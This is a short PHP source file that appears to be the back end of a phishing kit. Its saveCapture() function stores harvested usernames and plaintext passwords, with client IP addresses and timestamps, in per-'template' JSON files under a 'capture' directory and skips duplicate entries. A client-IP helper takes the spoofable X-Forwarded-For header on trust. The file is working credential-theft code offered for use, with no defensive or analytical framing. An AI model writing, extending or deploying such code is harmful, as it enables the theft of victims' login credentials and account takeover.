<?php
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: no-referrer");

function sanitize($data) {
    return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');
}

function getClientIP() {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    return sanitize($ip);
}

function saveCapture($record) {
    $captureDir = __DIR__ . '/capture';
    if (!is_dir($captureDir)) {
        mkdir($captureDir, 0755, true);
    }

    $template = $record['template'] ?? 'unknown';
    $file = $captureDir . '/' . preg_replace('/[^a-zA-Z0-9_-]/', '', $template) . '.json';
    $data = [];

    if (file_exists($file)) {
        $content = file_get_contents($file);
        $decoded = json_decode($content, true);
        if (is_array($decoded)) {
            $data = $decoded;
        }
    }

    // Check for exact duplicates
    foreach ($data as $existing) {
        if (($existing['username'] ?? '') === ($record['username'] ?? '') &&
            ($existing['password'] ?? '') === ($record['password'] ?? '') &&
            ($existing['template'] ?? '') === $template) {
            // Already exists, don't append
            return;
        }
    }

    $newRecord = [
        'timestamp'  => date('Y-m-d H:i:s'),
        'template'   => $template,
        'ip_address' => $record['ip_address'] ?? 'unknown',
        'username'   => $record['username'] ?? '',
        'password'   => $record['password'] ?? ''
    ];

    $data[] = $newRecord;
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}
